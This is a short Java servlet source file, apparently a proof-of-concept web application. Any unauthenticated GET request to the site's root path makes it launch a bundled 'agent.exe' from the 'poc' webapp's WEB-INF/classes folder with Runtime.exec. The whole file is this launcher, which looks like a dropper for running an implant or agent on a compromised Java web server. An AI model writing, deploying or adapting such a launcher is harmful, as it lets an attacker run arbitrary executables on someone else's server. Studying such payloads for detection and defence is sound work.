package org.example;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import java.io.IOException;
import java.io.PrintWriter;

@WebServlet("/")
public class RunExe extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        response.setContentType("text/html");
        PrintWriter out = response.getWriter();

        String agentPath = System.getProperty("user.dir") + "\\webapps\\poc\\WEB-INF\\classes\\agent.exe";
        out.println(agentPath);
        try {
            Process process = Runtime.getRuntime().exec(agentPath);
            out.println("Executable started successfully!");
        } catch (Exception e) {
            out.println("Error: " + e.getMessage());
        }
    }
}
